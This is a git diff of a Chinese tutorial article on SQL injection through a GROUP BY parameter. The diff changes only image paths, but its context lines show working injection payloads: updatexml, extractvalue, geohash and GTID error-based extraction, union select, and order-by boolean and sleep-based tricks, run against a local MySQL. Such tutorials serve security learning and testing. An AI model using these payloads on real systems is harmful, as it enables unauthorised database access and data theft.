@@ -93,7 +93,7 @@ FROM employees;
 
 在groupby参数的id加上单引号，引起报错，泄露SQL语句
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739474.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739474.png)
 
 可以看到这里的group by 是存在拼接的，这个id是可控的，很明显是一个注入点。
 
@@ -118,7 +118,7 @@ id/**/and/**/updatexml(1,concat(0x7e,(/*!12345select*//**/version()),0x7e),1)
 
 布尔注入的顺序会不同，得出版本：
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739431.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739431.png)
 
 这里我字符加少了，只加了数字0-9，字母a-f，和符号.号，但版本的话大部分情况下数字0-9，加上符号点号.，够用了。如果是数据库名的话，想要全一点就是大小写字母&#43;数字&#43;短杠和下划线。
 
@@ -126,11 +126,11 @@ id/**/and/**/updatexml(1,concat(0x7e,(/*!12345select*//**/version()),0x7e),1)
 
 extractvalue语句：
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739491.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739491.png)
 
 updatexml语句：
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739688.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739688.png)
 
 ### 本地环境
 
@@ -234,7 +234,7 @@ mysql&gt; select * from users where id=2 group by 6;
 ERROR 1054 (42S22): Unknown column &#39;6&#39; in &#39;group statement&#39;
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739401.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739401.png)
 
 还有一种报错情况，如下：
 
@@ -263,13 +263,13 @@ ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;group statement&#39;
 mysql&gt;
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739798.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739798.png)
 
 这个错误提示是由于MySQL的`sql_mode`配置中启用了`only_full_group_by`模式，它要求在使用`GROUP BY`子句时，SELECT列表中的非聚合列必须包含在GROUP BY子句中。
 
 上述案例中id是非聚合列，所以必须要带上，如下：
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739667.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739667.png)
 
 还有一种情况， group by后面的参数只能控制一部分，比如如下sql语句：
 
@@ -297,7 +297,7 @@ mysql&gt; select * from users where username like &#39;admin%&#39; group by user
 ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;group statement&#39;
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739974.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739974.png)
 
 ### 联合查询
 
@@ -307,7 +307,7 @@ ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;group statement&#39;
 
 Group by 后面可以接union select，但无法控制回显位置。
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740028.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740028.png)
 
 但但是，group by用于分类查询，limit语句只能放在后面位置，可以通过注释符注释掉它。
 
@@ -338,7 +338,7 @@ mysql&gt; select * from users where username like &#39;admin%&#39; group by id u
 6 rows in set (0.01 sec)
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739913.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161739913.png)
 
 修改PHP SQL查询语句：
 
@@ -351,7 +351,7 @@ $result=mysql_query($sql);
 
 Payload:`groupby=id union select 1,user(),version()`
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740153.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740153.png)
 
 ### 报错注入
 
@@ -385,9 +385,9 @@ ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LA
 mysql&gt;
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740311.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740311.png)
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740307.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740307.png)
 
 ```sql
 # mysql 8.0.31 失败
@@ -400,7 +400,7 @@ mysql&gt; select * from users where id=2 group by 1,(ST_LongFromGeoHash((select 
 1 row in set (0.01 sec)
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740592.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740592.png)
 
 #### GTID报错
 
@@ -414,9 +414,9 @@ mysql&gt; select * from users where username like &#39;admin%&#39; group by user
 ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740359.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740359.png)
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740297.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740297.png)
 
 mysql 8.0.31失败
 
@@ -430,7 +430,7 @@ mysql 8.0.31失败
 id order by rand(substr(version(),1,1)=&#39;8&#39;)
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740985.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740985.png)
 
 因为group by后面可以接order by，所以适用于order by注入点的方法都可以用。
 
@@ -450,7 +450,7 @@ mysql&gt; select * from users group by 1 order by sleep(1);
 3 rows in set (3.01 sec)
 ```
 
-![图片](/resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740643.png)
+![图片](resource/SQL注入之GroupBy位置点注入.assets/640-20230814161740643.png)
 
 所以这种方法不推荐使用，尤其是查询大型数据库。
 
@@ -476,7 +476,7 @@ mysql&gt; select * from users group by 1 order by sleep(1);
 
 微信扫一扫，关注该公众号
 
-![img](/resource/SQL注入之GroupBy位置点注入.assets/qrcode)
+![img](resource/SQL注入之GroupBy位置点注入.assets/qrcode.png)
 
 
 
